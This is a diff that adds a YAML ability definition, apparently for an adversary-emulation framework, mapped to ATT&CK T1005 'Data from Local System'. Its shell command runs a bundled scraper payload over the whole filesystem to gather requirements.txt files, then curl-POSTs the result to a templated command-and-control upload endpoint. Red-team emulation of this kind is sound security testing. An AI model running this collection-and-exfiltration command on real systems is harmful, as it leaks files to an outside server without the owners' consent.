@@ -1,0 +1,15 @@
+- id: 8da17889-80d9-4ef1-aa7c-5f28e5a3bf65
+  name: Gather requirements.txt files
+  description: Gather requirements.txt files
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    linux:
+      sh:
+        command: "./requirements_scraper.exe /tmp/requirements_files.txt / &&
+          curl -X POST -F data=@/tmp/requirements_files.txt #{app.contact.http}/file/upload"
+        payloads:
+        - requirements_scraper.exe
+        cleanup: rm -f /tmp/requirements_files.txt
